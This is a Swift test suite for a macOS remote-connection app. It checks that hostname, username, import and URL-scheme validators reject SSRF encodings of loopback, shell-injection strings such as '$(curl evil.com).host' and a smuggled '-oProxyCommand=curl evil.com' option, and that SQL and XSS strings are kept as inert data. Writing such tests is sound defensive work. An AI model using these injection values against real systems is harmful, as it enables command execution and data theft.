import Testing
import Foundation
@testable import RemminaMac

@Suite("Security Tests — SSRF, Injection, Edge Cases")
struct SecurityTests {
    
    // MARK: - SSRF Bypass via Encoded IP Notation
    
    @Test("Block octal IP 0177.0.0.1 (= 127.0.0.1)")
    func testBlockOctalIP() {
        #expect(throws: HostnameValidator.ValidationError.self) {
            try HostnameValidator.validate("0177.0.0.1")
        }
    }
    
    @Test("Block hex IP 0x7f000001 (= 127.0.0.1)")
    func testBlockHexIP() {
        #expect(throws: HostnameValidator.ValidationError.self) {
            try HostnameValidator.validate("0x7f000001")
        }
    }
    
    @Test("Block hex dotted IP 0x7f.0x0.0x0.0x1")
    func testBlockHexDottedIP() {
        #expect(throws: HostnameValidator.ValidationError.self) {
            try HostnameValidator.validate("0x7f.0x0.0x0.0x1")
        }
    }
    
    @Test("Block zero-padded IP 127.000.000.001")
    func testBlockZeroPaddedIP() {
        #expect(throws: HostnameValidator.ValidationError.self) {
            try HostnameValidator.validate("127.000.000.001")
        }
    }
    
    @Test("Block decimal IP 2130706433 (= 127.0.0.1)")
    func testBlockDecimalIP() {
        #expect(throws: HostnameValidator.ValidationError.self) {
            try HostnameValidator.validate("2130706433")
        }
    }
    
    @Test("Block URL-encoded hostname %31%32%37.0.0.1")
    func testBlockURLEncodedHostname() {
        #expect(throws: HostnameValidator.ValidationError.dangerousCharacters) {
            try HostnameValidator.validate("%31%32%37.0.0.1")
        }
    }
    
    @Test("IPv4-mapped IPv6 ::ffff:127.0.0.1 is blocked as loopback only when blockLocalhost is set")
    func testBlockIPv4MappedIPv6Loopback() throws {
        // ::ffff:127.0.0.1 resolves to loopback via the embedded IPv4 address;
        // HostnameValidator maps it and re-applies the IPv4 rules, so it must
        // be rejected exactly when a plain "127.0.0.1" would be.
        #expect(throws: HostnameValidator.ValidationError.blockedLoopback) {
            try HostnameValidator.validate("::ffff:127.0.0.1", blockLocalhost: true)
        }

        // With defaults (blockLocalhost: false), loopback is not blocked, so
        // this must succeed and return the trimmed input unchanged.
        let result = try HostnameValidator.validate("::ffff:127.0.0.1")
        #expect(result == "::ffff:127.0.0.1")
    }
    
    @Test("Block scheme-prefixed URLs")
    func testBlockSchemeURLs() {
        #expect(throws: HostnameValidator.ValidationError.self) {
            try HostnameValidator.validate("http://internal.corp")
        }
        #expect(throws: HostnameValidator.ValidationError.self) {
            try HostnameValidator.validate("ssh://target")
        }
    }
    
    // MARK: - Command Injection via Hostname
    
    @Test("Block semicolon injection in hostname")
    func testBlockSemicolonInjection() {
        #expect(throws: HostnameValidator.ValidationError.dangerousCharacters) {
            try HostnameValidator.validate("example.com; rm -rf /")
        }
    }
    
    @Test("Block backtick injection in hostname")
    func testBlockBacktickInjection() {
        #expect(throws: HostnameValidator.ValidationError.dangerousCharacters) {
            try HostnameValidator.validate("`whoami`.evil.com")
        }
    }
    
    @Test("Block $() substitution in hostname")
    func testBlockDollarSubstitution() {
        #expect(throws: HostnameValidator.ValidationError.dangerousCharacters) {
            try HostnameValidator.validate("$(curl evil.com).host")
        }
    }
    
    @Test("Block pipe injection in hostname")
    func testBlockPipeInjection() {
        #expect(throws: HostnameValidator.ValidationError.dangerousCharacters) {
            try HostnameValidator.validate("example.com | cat /etc/passwd")
        }
    }
    
    @Test("Block newline injection in hostname")
    func testBlockNewlineInjection() {
        #expect(throws: HostnameValidator.ValidationError.dangerousCharacters) {
            try HostnameValidator.validate("example.com\n-oProxyCommand=curl evil.com")
        }
    }
    
    @Test("Block null byte injection in hostname")
    func testBlockNullByteInjection() {
        #expect(throws: HostnameValidator.ValidationError.dangerousCharacters) {
            try HostnameValidator.validate("example.com\0.evil.com")
        }
    }
    
    // MARK: - Command Injection via Username (ProfileValidator)
    
    @Test("Block shell metacharacters in username")
    func testBlockShellMetacharsInUsername() {
        #expect(throws: ProfileValidator.ValidationError.usernameInvalid) {
            try ProfileValidator.validateUsername("admin;whoami")
        }
    }
    
    @Test("Block backtick in username")
    func testBlockBacktickInUsername() {
        #expect(throws: ProfileValidator.ValidationError.usernameInvalid) {
            try ProfileValidator.validateUsername("`id`")
        }
    }
    
    // MARK: - Keychain Edge Cases
    
    /// Per-test random-service KeychainStore — never touches the developer's
    /// real login keychain (the production service name).
    private func makeTestKeychainStore() -> KeychainStore {
        KeychainStore(service: "com.stormbringer-v1.remminamac.tests." + UUID().uuidString)
    }

    @Test("Unicode password round-trip through Keychain")
    func testKeychainUnicodePassword() throws {
        let store = makeTestKeychainStore()
        let profileId = UUID()
        let unicodePassword = "пароль🔐中文密码"
        defer { store.deletePassword(for: profileId) }

        let saved = store.savePassword(unicodePassword, for: profileId)
        #expect(saved == true)

        let retrieved = try store.password(for: profileId)
        #expect(retrieved == unicodePassword)
    }

    @Test("Very long password through Keychain")
    func testKeychainLongPassword() throws {
        let store = makeTestKeychainStore()
        let profileId = UUID()
        let longPassword = String(repeating: "A", count: 10_000) // 10KB
        defer { store.deletePassword(for: profileId) }

        let saved = store.savePassword(longPassword, for: profileId)
        #expect(saved == true)

        let retrieved = try store.password(for: profileId)
        #expect(retrieved == longPassword)
    }

    @Test("Special characters password through Keychain")
    func testKeychainSpecialCharsPassword() throws {
        let store = makeTestKeychainStore()
        let profileId = UUID()
        let specialPassword = #"p@$$w0rd!<>"'\&|;`$()"#
        defer { store.deletePassword(for: profileId) }

        let saved = store.savePassword(specialPassword, for: profileId)
        #expect(saved == true)

        let retrieved = try store.password(for: profileId)
        #expect(retrieved == specialPassword)
    }

    @Test("Empty string password through Keychain")
    func testKeychainEmptyPassword() throws {
        let store = makeTestKeychainStore()
        let profileId = UUID()
        defer { store.deletePassword(for: profileId) }

        let saved = store.savePassword("", for: profileId)
        #expect(saved == true)

        let retrieved = try store.password(for: profileId)
        #expect(retrieved == "")
    }
    
    // MARK: - Import Hardening
    
    @Test("Import rejects a profile whose tags field is genuinely deeply nested JSON, without crashing")
    func testRejectDeeplyNestedJSON() {
        // `tags` is declared as `[String]`; feed it 200 levels of nested
        // arrays instead. ProfileDTO's Codable init is strict (unknown keys
        // and type mismatches both throw), so this must fail with a decoding
        // error rather than parse successfully — and it must not hang or
        // crash on the recursion itself.
        let depth = 200
        let nestedTags = String(repeating: "[", count: depth) + String(repeating: "]", count: depth)
        let json = """
        {"version": 1, "exportDate": "2026-01-01T00:00:00Z", "profiles": [{
            "name": "Test",
            "protocolType": "SSH",
            "host": "example.com",
            "port": 22,
            "username": "admin",
            "domain": "",
            "notes": "",
            "tags": \(nestedTags),
            "isFavorite": false,
            "connectOnOpen": false
        }]}
        """
        let data = Data(json.utf8)

        #expect(throws: (any Error).self) {
            _ = try ProfileImportExport.importProfiles(from: data)
        }
    }
    
    @Test("Import accepts SQL-injection-shaped text in the name field as inert data and round-trips it unchanged")
    func testImportSQLInjectionInName() throws {
        let json = """
        {
            "version": 1,
            "exportDate": "2026-01-01T00:00:00Z",
            "profiles": [{
                "name": "'; DROP TABLE profiles; --",
                "protocolType": "SSH",
                "host": "example.com",
                "port": 22,
                "username": "admin",
                "domain": "",
                "notes": "",
                "tags": [],
                "isFavorite": false,
                "connectOnOpen": false
            }]
        }
        """
        let data = Data(json.utf8)
        // Should import successfully — SwiftData uses parameterized queries, so SQL injection
        // in the name won't cause damage. The name is just stored verbatim.
        let profiles = try ProfileImportExport.importProfiles(from: data)
        #expect(profiles.count == 1)
        #expect(profiles[0].name == "'; DROP TABLE profiles; --")
    }
    
    @Test("Import accepts an HTML/JS-shaped payload in the notes field as inert data and round-trips it unchanged")
    func testImportXSSInNotes() throws {
        let json = """
        {
            "version": 1,
            "exportDate": "2026-01-01T00:00:00Z",
            "profiles": [{
                "name": "Test",
                "protocolType": "SSH",
                "host": "example.com",
                "port": 22,
                "username": "admin",
                "domain": "",
                "notes": "<script>alert('xss')</script>",
                "tags": [],
                "isFavorite": false,
                "connectOnOpen": false
            }]
        }
        """
        let data = Data(json.utf8)
        // XSS is a web concern; native SwiftUI renders Text() safely.
        // This should import fine — notes are just strings displayed via SwiftUI Text
        let profiles = try ProfileImportExport.importProfiles(from: data)
        #expect(profiles.count == 1)
        #expect(profiles[0].notes.contains("<script>"))
    }
    
    @Test("Import rejects binary data")
    func testImportBinaryData() {
        // Random binary data should be rejected as invalid JSON
        var data = Data(count: 512)
        for i in 0..<512 {
            data[i] = UInt8.random(in: 0...255)
        }
        
        do {
            _ = try ProfileImportExport.importProfiles(from: data)
            #expect(Bool(false), "Should have thrown error")
        } catch {
            // Expected — either invalidJSON or some other error
        }
    }
    
    @Test("Import handles duplicate profile names gracefully")
    func testImportDuplicateNames() throws {
        let json = """
        {
            "version": 1,
            "exportDate": "2026-01-01T00:00:00Z",
            "profiles": [
                {
                    "name": "Same Name",
                    "protocolType": "SSH",
                    "host": "host1.com",
                    "port": 22,
                    "username": "admin",
                    "domain": "",
                    "notes": "",
                    "tags": [],
                    "isFavorite": false,
                    "connectOnOpen": false
                },
                {
                    "name": "Same Name",
                    "protocolType": "VNC",
                    "host": "host2.com",
                    "port": 5900,
                    "username": "admin",
                    "domain": "",
                    "notes": "",
                    "tags": [],
                    "isFavorite": false,
                    "connectOnOpen": false
                }
            ]
        }
        """
        let data = Data(json.utf8)
        // Duplicate names are allowed (profiles have separate UUIDs)
        let profiles = try ProfileImportExport.importProfiles(from: data)
        #expect(profiles.count == 2)
    }
    
    // MARK: - Password Exposure Prevention

    // (A prior "Log entries never contain password strings" test lived here.
    // It logged strings that never contained the password and then asserted
    // they didn't — it could not fail, so it proved nothing. The meaningful
    // version of this check — that a real credential-handling call site
    // (SSHSession init, KeychainStore save/get/delete) never passes the
    // password to AppLogger — lives in C2AuditTests.)

    @Test("SessionStatus displays sanitized information")
    func testSessionStatusSanitized() {
        let status1 = SessionStatus.connected
        #expect(status1.displayName == "Connected")
        #expect(!status1.displayName.contains("password"))
        
        let status2 = SessionStatus.error("Connection failed (exit code 1) — verify credentials and host")
        #expect(!status2.displayName.contains("password"))
        
        let status3 = SessionStatus.connecting
        #expect(status3.displayName == "Connecting…")
    }
    
    // MARK: - ProtocolType Exhaustiveness
    
    @Test("All protocol types have valid default ports")
    func testAllProtocolsHaveDefaultPorts() {
        for proto in ProtocolType.allCases {
            let port = proto.defaultPort
            #expect(port >= 1 && port <= 65535, "\(proto) port \(port) out of range")
        }
    }
    
    @Test("All protocol types have icon names")
    func testAllProtocolsHaveIcons() {
        for proto in ProtocolType.allCases {
            #expect(!proto.iconName.isEmpty, "\(proto) has no icon")
        }
    }
    
    @Test("All protocol types have display names")
    func testAllProtocolsHaveDisplayNames() {
        for proto in ProtocolType.allCases {
            #expect(!proto.displayName.isEmpty, "\(proto) has no display name")
        }
    }
    
    @Test("Unknown protocol raw value defaults to SSH")
    func testUnknownProtocolDefaultsToSSH() {
        let profile = ConnectionProfile(
            name: "Test",
            protocolType: .ssh,
            host: "host"
        )
        profile.protocolRawValue = "TELNET" // Invalid
        #expect(profile.protocolType == .ssh) // Should default
    }
    
    // MARK: - SecuritySettings (clipboard + URL scheme gating)

    @MainActor
    @Test("SecuritySettings: link scheme allowlist")
    func testLinkSchemeAllowlist() {
        #expect(SecuritySettings.isLinkSchemeAllowed(URL(string: "https://example.com")!) == true)
        #expect(SecuritySettings.isLinkSchemeAllowed(URL(string: "http://example.com")!) == true)
        #expect(SecuritySettings.isLinkSchemeAllowed(URL(string: "mailto:foo@example.com")!) == true)
        // Schemes we deliberately refuse to open on behalf of a remote.
        #expect(SecuritySettings.isLinkSchemeAllowed(URL(string: "file:///etc/passwd")!) == false)
        #expect(SecuritySettings.isLinkSchemeAllowed(URL(string: "ssh://host")!) == false)
        #expect(SecuritySettings.isLinkSchemeAllowed(URL(string: "tel://1234")!) == false)
        #expect(SecuritySettings.isLinkSchemeAllowed(URL(string: "ftp://example.com")!) == false)
        #expect(SecuritySettings.isLinkSchemeAllowed(URL(string: "x-callback-url://foo")!) == false)
        #expect(SecuritySettings.isLinkSchemeAllowed(URL(string: "javascript:alert(1)")!) == false)
        // No scheme.
        #expect(SecuritySettings.isLinkSchemeAllowed(URL(string: "/etc/passwd")!) == false)
    }

    @MainActor
    @Test("SecuritySettings: remote clipboard, link opening, and RDP ignoreCert persist correctly")
    func testSecuritySettingsDefaultToSafe() {
        let settings = SecuritySettings.shared
        let origIgnore = settings.rdpIgnoreCertificate
        let origClip = settings.allowRemoteClipboard
        defer {
            settings.rdpIgnoreCertificate = origIgnore
            settings.allowRemoteClipboard = origClip
        }

        settings.rdpIgnoreCertificate = true
        #expect(settings.rdpIgnoreCertificate == true)
        #expect(UserDefaults.standard.bool(forKey: "security.rdpIgnoreCertificate") == true)

        settings.rdpIgnoreCertificate = false
        #expect(settings.rdpIgnoreCertificate == false)
        #expect(UserDefaults.standard.bool(forKey: "security.rdpIgnoreCertificate") == false)

        settings.allowRemoteClipboard = true
        #expect(settings.allowRemoteClipboard == true)
        #expect(UserDefaults.standard.bool(forKey: "security.allowRemoteClipboard") == true)

        settings.allowRemoteClipboard = false
        #expect(settings.allowRemoteClipboard == false)
        #expect(UserDefaults.standard.bool(forKey: "security.allowRemoteClipboard") == false)
    }
}
